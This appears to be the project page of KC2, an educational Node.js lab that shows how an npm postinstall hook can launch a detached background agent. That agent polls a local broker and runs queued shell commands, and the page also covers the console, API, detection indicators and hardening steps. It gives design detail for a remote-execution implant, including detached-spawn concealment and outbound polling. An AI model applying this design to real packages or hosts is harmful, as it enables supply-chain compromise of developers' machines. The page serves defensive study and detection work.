What KC2 is

  • github.com/aykhan019/kc2
  • Node.js 18+
  • No runtime dependencies
  • Apache-2.0

KC2: Kapital C2 is a self-contained Node.js lab that reproduces one specific supply-chain risk end to end: npm lifecycle scripts execute package code automatically during npm install, with the installing user's privileges and no prompt. The lab models the control channel an attacker would build on top of that foothold — a small HTTP task broker, a file-based task queue, and an interactive operator console — and pairs it with a trojanized-but-functional demo package whose postinstall hook starts a background agent on the test host.

The implementation uses only Node.js built-ins. There are no runtime dependencies, no database, and no external service. Every file is short enough to read in one sitting, and the comments are written to be read — the codebase is the teaching material.

What it is not

KC2 is not a command-and-control framework, and it is not a red-team operations tool. It deliberately implements none of the capabilities that make real malware dangerous: no persistence, no evasion, no obfuscation, no credential theft, no file collection, no encryption. Those omissions are safety rails, not missing features. The attack mechanism it demonstrates — code execution on install — is a documented npm feature, and the lab exists so that defenders, students, and reviewers can watch it happen under controlled conditions.

This page is ordered so a reader can stop at any point and have gotten something: the legal constraint first, then the mechanism and why it matters, then the architecture, then how to run the lab, then the references and the detections.

Authorized use only

Read this before running anything

KC2 demonstrates behavior that would be unlawful against systems you do not own. Running it against any machine you do not own or lack written authorization to test is illegal in most jurisdictions — including the Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and equivalents elsewhere. Authorization is the user's responsibility, not the tool's.

Three rules follow, and the lab is built around them:

  • Localhost by default. The server binds to 127.0.0.1 and the agent points at 127.0.0.1 out of the box. Reaching another machine requires a deliberate configuration change on both ends.
  • Never expose the broker to the public internet. The HTTP API has no authentication and no encryption by design — it is a localhost teaching artifact. A two-machine lab belongs on a private test network behind host firewall rules.
  • Never publish the package. totally-legit-utils must not be uploaded to the npm registry or installed on any third-party system. Remove the test agent after every session: pkill -f "victim-package/agent.js".

Keep experiments isolated, obtain written authorization for anything beyond your own machines, and treat the lab's output the way you would treat any offensive-security training material.

Why npm lifecycle scripts are worth a lab

When you run npm install, npm executes the package's lifecycle scripts — preinstall, install, postinstall — as shell commands, automatically, with your privileges. No vulnerability is involved; this is how the ecosystem is specified to work, and legitimate packages use it to compile native modules.

Real incidents abused exactly this mechanism. event-stream shipped a malicious dependency to millions of weekly downloads through a maintainer handover. ua-parser-js and coa/rc were hijacked and published with install-time stealers. Typosquats — crossenv against cross-env, lodahs against lodash — exist almost entirely to run a lifecycle hook on a developer's machine. The hook runs with the developer's tokens, SSH keys, and CI secrets within reach, and it runs before anyone has read a line of the package's code.

The uncomfortable part, and the reason the lab exists: nothing about this is exotic. There is no memory corruption, no sandbox escape, no zero-day. The entire attack is a documented feature used as documented, plus a process-management detail — and that detail is where KC2 spends its teaching effort.

The attack chain

 npm install totally-legit-utils
        |
        v  [1] postinstall hook runs synchronously, with the victim's privileges
 install.js
        |
        v  [2] spawns a DETACHED agent process, prints nothing suspicious, exits 0
 agent.js (background)
        |
        +--> [3] BEACON   POST /api/beacon    host info; learns its agent id and observed IP
        +--> [4] POLL     GET  /api/taskfile  every 5 s; matches jobs by observed IP
        +--> [5] EXECUTE  one-shot shell command, with the victim's privileges
        +--> [6] REPORT   POST /api/results   stdout/stderr; server consumes the job

The design decisions that make it realistic

A lab that behaves nothing like the real thing teaches nothing. Four details in KC2 mirror what actual trojanized packages do, and each is there for a reason.

The postinstall stub exists so the install looks normal

npm runs lifecycle scripts synchronously — the install does not finish until the script exits. An agent loop placed directly in postinstall makes the victim's npm install appear to hang forever, which is a dead giveaway. Real trojanized packages avoid this: the hook spawns a detached background process (detached: true, stdio: 'ignore', child.unref()) and immediately exits 0. npm reports success, the install is fast, and the agent keeps running afterwards. victim-package/install.js is exactly that stub — its whole job is launching agent.js and getting out of the way.

Unlike real malware, the lab prints one line — [kc2] install ok — agent running in background — because a teaching tool stays observable. Real malware is silent here. That single difference is worth stating aloud in a classroom.

The package has a cover story

Real trojanized packages are rarely empty; they provide genuinely useful code so people keep them installed, or they copy the source of the package they impersonate. totally-legit-utils ships two working string utilities (capitalize, reverse) in index.js. The victim gets functioning code and never suspects the install hook already ran. When reviewing a suspicious package, working code is not evidence of safety — it is the expected camouflage.

Tasking is a dead drop, and all traffic is outbound

The operator never connects to a test host. The console writes jobs into a task file; the server serves that file over HTTP; agents poll it. This is the dead-drop pattern, and it matters for one reason: outbound connections pass through firewalls and NAT, inbound ones do not. A lab that required inbound access to the victim would be teaching a channel that fails in the real world. The three requests — beacon, poll, report — are all initiated by the agent.

Tasks are one-shot jobs, not a single overwritten command

Each task command appends an independent job (id, ip, command) to the queue. Multiple jobs can be pending for the same host. The agent tracks the job ids it has already started, runs each new id exactly once, and posts the result with that id; the server removes the job when the matching result arrives. A job lives exactly until its result comes back — the queue on disk is always the set of things still owed, which makes tasks.yaml a human-readable audit of unfinished tasking at any moment.

The safety model

The limits below are deliberate. They are enforced by simply not existing in the code, and they should not be "fixed" for realism — the lab's value is that the dangerous parts are absent and the instructive parts are faithful.

  • No persistence. The agent installs no launch hooks and dies at reboot or logout. Stop it any time with pkill -f "victim-package/agent.js".
  • No evasion or obfuscation. Every file is plain, commented JavaScript. Detection rules written against this lab key on real behavior — process lineage, polling cadence, endpoint shapes — not on artifacts of packing.
  • No collection. The agent runs what the operator queues and reports the output. It does not enumerate files, read credentials, or stage data.
  • No encryption, no authentication. The broker speaks plain HTTP with no auth. That is a property to discuss in detection engineering — what would TLS change about your network detections? — not a hole to patch in a localhost lab.
  • Graceful degradation, not hiding. If the server is unreachable at install time, the agent exits silently — as real malware would — and only a later package run retries. If the server restarts, the agent re-beacons after three failed polls, because a restarted server has forgotten all agents.

Quick start

Requirements: Node.js 18 or newer, npm, and two terminals. Nothing needs to be installed for the server or the agent themselves.

1. Start the server

node server/server.js

The server binds to 127.0.0.1:4444 and opens the kc2> operator console.

2. Install the package in a disposable directory

install into a disposable directory
mkdir -p /tmp/kc2-victim && cd /tmp/kc2-victim
npm init -y
npm install /absolute/path/to/kc2/victim-package

The console reports the check-in:

kc2> console
[+] NEW AGENT #1  lab@testbox
           ip=127.0.0.1  platform=Linux x64
           -> task it with:  task 1 <command>

To demonstrate the defense instead of the attack, repeat with scripts disabled — the install succeeds and no agent ever starts: 

npm install --ignore-scripts /absolute/path/to/kc2/victim-package

3. Task the host and read the results

kc2> console
kc2> task 1 whoami
kc2> task 1 hostname
kc2> task 1 pwd
kc2> history

Each result arrives as the agent's next poll picks up the job:

kc2> console
[<] RESULT from agent #1 (ip=127.0.0.1, task #1)
           $ whoami
           lab

Stop the lab when finished:

pkill -f "victim-package/agent.js"

Operator console reference

Command Purpose
agents List checked-in test hosts: id, user@host, ip, platform, last seen, pending jobs
task <id|ip> <command> Queue one one-shot shell command (repeatable — jobs never overwrite)
untask <id|ip> Cancel all pending jobs for a host
tasks Show the pending queue (the live contents of tasks.yaml)
history [n] Show the latest n results; defaults to 10. The buffer holds the last 100, in memory only
help Command help
exit Stop the server (Ctrl+D or piped-stdin EOF also exits)

Targets resolve by agent id (task 1 …) or literal IP (task 10.0.0.5 …). Re-checkins from the same user@host at the same IP reuse the existing agent id rather than flooding the list — an agent that restarts is the same agent.

HTTP API reference

Plain HTTP, no authentication — localhost lab only.

Method Path Body Response Notes
POST /api/beacon {hostname, username, platform} {agentId, ip} Deduplicates on ip + username + hostname; the returned ip is the server's view of the client and becomes the task-queue key
GET /api/taskfile — text/plain Regenerated from in-memory state on every request; updates the agent's lastSeen
POST /api/results {taskId, agentId, ip, command, output} {ok: true} Consumes the matching one-shot job; results append to the bounded history buffer

The task file is a strict YAML subset, parsed by the same small regex grammar on both ends — deliberately not a general YAML parser:

server/tasks.yaml
tasks:
  - id: 12
    ip: "127.0.0.1"
    command: "whoami"

server/tasks.yaml is regenerated by the console on every change and reloaded at boot, so a server restart does not wipe pending tasking. Never edit it by hand; the older id-less format is still accepted on load for backward compatibility and is upgraded automatically.

Configuration reference

Variable Default Description
KC2_BIND 127.0.0.1 Server bind address
KC2_PORT 4444 Server and agent port
KC2_HOST 127.0.0.1 Server address used by the agent
KC2_COLOR automatic 1 forces ANSI colors; 0 disables them
NO_COLOR unset Standard terminal color opt-out

Agent timing constants live at the top of victim-package/agent.js: a 5-second poll interval, and re-beaconing after 3 consecutive failed polls.

An authorized two-machine lab on a private network:

authorized two-machine lab
KC2_BIND=192.168.1.42 node server/server.js
KC2_HOST=192.168.1.42 npm install /absolute/path/to/kc2/victim-package

Detection engineering

The lab is instrumented to be observable, and its behaviors are the ones real npm malware exhibits. Use it to validate detections before you need them.

Host-based indicators

  • Process lineage: a node process parented to npm that outlives the install — the detached-spawn signature
  • A long-lived node …/victim-package/agent.js process with no terminal attached
  • postinstall: "node install.js" in a dependency that has no business running code at install time
  • The lab's own transparency string in install logs: [kc2] install ok — agent running in background

Network-based indicators

  • A fixed-cadence poll (GET /api/taskfile every 5 s) — beaconing intervals are detectable even when real malware adds jitter
  • POST /api/beacon carrying host inventory as JSON; POST /api/results carrying command output
  • Plaintext HTTP from a developer workstation to an unusual destination port (default 4444)

Hardening takeaways

  • Prefer npm install --ignore-scripts whenever lifecycle scripts are not needed; set npm config set ignore-scripts true in controlled build environments.
  • Use npm ci with reviewed lockfiles in isolated CI; review lockfile diffs and transitive dependencies, not just direct ones.
  • Alert on package-manager child processes that persist after the install exits.
  • Treat any postinstall behavior in a dependency as a review signal, not an implementation detail.

Known limitations

Stated plainly, because a lab that hides its simplifications teaches false confidence:

  • IP-keyed tasking. Jobs are matched by the IP the server observes. Two test hosts behind the same NAT or egress address share one identity in the queue — the lab's matching scheme, like many real ones, has no answer to that.
  • Output size cap. Results larger than Node's default exec buffer (1 MB) fail; the error text becomes the result.
  • First-contact failure is silent. If the server is down at install time the agent exits and does not retry until the package runs again. Re-beaconing covers server restarts, not failed first contact.
  • Volatile history. The last 100 results live in server memory and vanish on exit; only the pending queue persists.
  • No auth, no TLS. Anyone who can reach the broker can beacon, read the queue, or post results. Localhost use only — this is also why the binding defaults exist.
  • No timestamp guarantees. Task ordering is queue order, and a host polls on its own schedule; nothing here is real-time.

Validation

There is no external test framework — the project is small enough that syntax checks plus a live smoke test are the honest bar:

syntax check
node --check server/server.js
node --check victim-package/install.js
node --check victim-package/agent.js
node --check victim-package/index.js

Then run the full loop by hand: server up, package installed into a disposable directory, task 1 id, and confirm the result returns and the job disappears from tasks.
